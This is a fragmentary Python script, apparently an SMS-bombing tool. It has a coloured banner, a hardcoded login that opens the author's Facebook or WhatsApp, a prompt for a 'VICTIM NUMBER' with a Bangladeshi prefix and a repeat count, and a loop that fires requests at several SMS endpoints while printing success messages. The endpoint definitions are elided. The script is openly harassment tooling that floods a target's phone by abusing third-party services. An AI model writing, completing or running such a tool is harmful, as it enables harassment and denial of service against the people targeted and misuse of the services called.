...
logo =                                          ("""
 ...
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mTOOL STATUS  \033[38;5;196m: \033[38;5;195m SMS-BOMBING            \033[38;5;46m
...
rp= 'SAMIUL'
x = '404'
if 'SAMIUL'==user and '404'==pas:
	Axak(g+"\n\n\t\t      LOGIN SUCCESSFUL FOLLOW MY FACEBOOK ")
	os.system('xdg-open https://www.facebook.com/piccir.bor.90')
else:
	Axak(y+"\n\n\t\t      Invalid User Or Pass")
	Axak(y+"\n\n\t\tContract Admin For User And Pass")
	os.system("xdg-open https://wa.me/+8801705327418")
...
number=input(f"{c}\n[ VICTIM NUMBER ] :{w} +880")
amo=int(input(c+"\n[ AMOUNT ] : "+w))
xak(f"\n\n\t {w}<{r}/{w}> {g}STAY WITH ŠH ŠHÃMÎUŁ 🌺 {w}<{r}/{w}>\n\n")
...
for i in range(amo):
	...
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥SAMIUL-CYBER-404🔥 "+w+tim)
	...
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥SAMIUL-CYBER-404🔥 "+w+tim)
	resp7 = requests.get(url7,headers=headers7)
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥SAMIUL-CYBER-404🔥 "+w+tim)
	...
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥SAMIUL-CYBER-404🔥 "+w+tim)
	resp14 = requests.post(url12,headers=headers12, data=data12)
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥SAMIUL-CYBER-404🔥 "+w+tim)
	...
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥SAMIUL-CYBER-404🔥 "+w+tim)
	resp20 = requests.post(url17,headers=headers17, data=data17)
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥SAMIUL-CYBER-404🔥  "+w+tim)
